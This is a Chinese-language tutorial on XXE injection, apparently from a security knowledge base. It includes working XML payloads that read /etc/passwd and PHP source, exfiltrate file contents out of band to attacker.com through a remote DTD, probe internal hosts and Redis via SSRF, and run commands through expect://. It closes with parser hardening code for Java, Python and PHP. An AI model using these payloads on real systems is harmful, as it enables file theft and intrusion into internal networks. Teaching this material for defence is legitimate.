---
title: "XXE外部实体注入详解"
description: "深入讲解XXE漏洞原理、DTD构造、Blind XXE与攻防实战"
pubDate: 2026-05-18
heroImage: ""
tags: ["漏洞原理", "XXE", "Web安全"]
category: "kb"
severity: "high"
cve: ""
vul_type: "XXE"
---

# XXE外部实体注入详解

## 漏洞原理

XXE（XML External Entity Injection）外部实体注入，发生在**应用程序解析XML输入时，没有禁止外部实体的加载**，导致攻击者可以通过构造恶意XML来读取服务器上的敏感文件或发起SSRF攻击。

```xml
<!-- 正常XML -->
<?xml version="1.0"?>
<user>
    <name>张三</name>
    <age>25</age>
</user>

<!-- 被注入后：读取/etc/passwd -->
<?xml version="1.0"?>
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
</user>
```

---

## XXE利用方式

### 1. 读取本地文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### 2. 读取PHP源码

```xml
<!-- 读取PHP文件（会被解析） -->
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<data>&xxe;</data>
```

### 3. Blind XXE（无回显）

利用外带数据（OOB）读取文件：

```xml
<!-- 本地构建恶意DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
]>
<data>test</data>

<!-- attacker.com/evil.dtd 内容 -->
<!ENTITY all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 4. XXE to SSRF

```xml
<!-- 内网探测 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://192.168.1.1/admin/">
]>
<data>&xxe;</data>

<!-- 探测Redis -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">
```

### 5. XXE to RCE（特殊场景）

```xml
<!-- PHP expect模块加载 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "expect://id">
]>
<data>&xxe;</data>

<!-- FTP拉取文件（Java） -->
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "ftp://attacker.com/file.txt">
]>
```

---

## 常见XXE触发点

| 功能点 | 测试Payload |
|--------|-----------|
| XML上传 | 上传包含XXE的XML文档 |
| SOAP API | SOAP消息体XML |
| RSS/Atom订阅 | RSS源XML |
| PDF/Office解析 | 文档内嵌XML |
| SVG上传 | SVG图片含XML |

```xml
<!-- SVG文件XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>
    <rect style="fill:red;fill-opacity:0" x="1" y="1"/>
    <text>&xxe;</text>
</svg>
```

---

## 防御方案

```java
// Java 防御
import javax.xml.parsers.DocumentBuilderFactory;
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// Python lxml防御
from lxml import etree
parser = etree.XMLParser(no_network=True, resolve_entities=False)

// PHP 防御
libxml_disable_entity_loader(true);
```
